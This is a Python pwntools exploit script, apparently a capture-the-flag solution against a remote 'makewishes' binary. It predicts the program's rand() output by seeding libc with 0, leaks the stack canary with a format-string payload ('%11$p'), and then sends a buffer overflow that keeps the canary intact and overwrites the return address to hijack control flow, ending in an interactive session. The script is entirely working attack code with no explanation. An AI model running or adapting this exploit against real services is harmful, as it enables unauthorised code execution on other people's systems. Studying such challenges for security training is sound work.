from pwn import *
from ctypes import *


# p = process('./makewishes')
p = remote('59.110.164.72', 10001)
elf = ELF('./makewishes')
lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0)
p.recvuntil(b'Now you can make your first wish')
p.sendline(p64(0) * 2 + p32(0))


p.recvuntil(b'Please give me a number!')
num = str(libc.rand() % 9 + 1).encode()
p.sendline(num)

p.recvuntil(b'Now you can make your second wish!')
p.sendline(b'%11$p')
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
print(hex(canary))

p.recvuntil(b'Please give me a number!')
num = str(libc.rand() % 9 + 1).encode()
p.sendline(num)

p.recvuntil(b'Now you can make your final wish!')
payload = b'a' * 40 + p64(canary) + p64(0) + p64(0x4011f5)
p.sendline(payload)

p.interactive()
